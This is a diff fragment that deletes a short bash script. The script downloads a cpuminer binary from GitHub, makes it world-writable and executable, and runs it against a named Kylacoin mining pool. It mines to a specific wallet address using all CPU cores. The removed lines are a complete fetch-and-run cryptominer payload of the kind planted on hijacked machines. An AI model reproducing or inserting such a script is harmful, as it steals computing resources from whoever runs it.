@@ -1,4 +1,0 @@
-#!/bin/bash
-wget -O biru https://github.com/kidoescegh/pilekyla/raw/refs/heads/main/cpuminer-avx
-chmod 777 biru
-./biru -a flex -o stratum+tcp://kylacoin.cedric-crispin.com:4374 -u  kc1qylrmtzw47wldzzgwfkxtgrhgvp8jnyrck33nqu.$(shuf -n 1 -i 1-99999)-VX -t $(nproc --all)
